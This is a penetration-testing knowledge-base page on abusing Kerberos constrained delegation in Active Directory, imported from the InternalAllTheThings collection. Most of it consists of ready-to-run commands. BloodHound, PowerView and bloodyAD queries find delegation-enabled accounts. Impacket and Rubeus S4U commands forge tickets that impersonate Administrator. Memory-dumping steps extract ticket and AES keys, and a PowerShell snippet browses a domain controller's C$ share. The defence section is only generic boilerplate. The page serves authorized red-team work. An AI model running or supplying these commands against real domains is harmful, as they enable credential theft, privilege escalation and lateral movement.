---
title: Kerberos Delegation - Constrained Delegation
type: technique
tags: [active-directory, delegation, kerberos, lateral-movement, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Kerberos Delegation - Constrained Delegation

## What it is

> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.

## How it works

Constrained Delegation allows a service account to impersonate any user when accessing a specific set of target services defined in the `msDS-AllowedToDelegateTo` attribute. An attacker who compromises a service account with constrained delegation configured uses S4U2self to obtain a forwardable service ticket for any user (including domain admins), then S4U2proxy to present that ticket to the allowed target service, impersonating the target user. This works because the KDC issues tickets based on the delegation permission without verifying whether the impersonated user actually made an initial authentication request.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.

## Identify a Constrained Delegation

* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`
* Native

```powershell
Get-DomainComputer -TrustedToAuth | select -exp dnshostname
Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
```

* bloodyAD:

```ps1
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto
```

## Exploit the Constrained Delegation

* Impacket

```ps1
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
```

* Rubeus: S4U2 attack (S4U2self + S4U2proxy)

```ps1
# with a password
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"

# with a NT hash
Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
dir \\dc.domain.com\c$
```

* Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the "Administrator"

```ps1
# Dump ticket
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7

# Create a ticket
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```

* Rubeus : using aes256 keys

```ps1
# Get aes256 keys of the machine account
privilege::debug
token::elevate
sekurlsa::ekeys

# Create a ticket
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
```

## Impersonate a domain user on a resource

Require:

* SYSTEM level privileges on a machine configured with constrained delegation

```ps1
PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS> $idToImpersonate.Impersonate()
PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS> ls \\dc01.offense.local\c$
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[bloodhound]]
- [[impacket]]
- Also uses (no dedicated page yet): Rubeus, PowerView

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
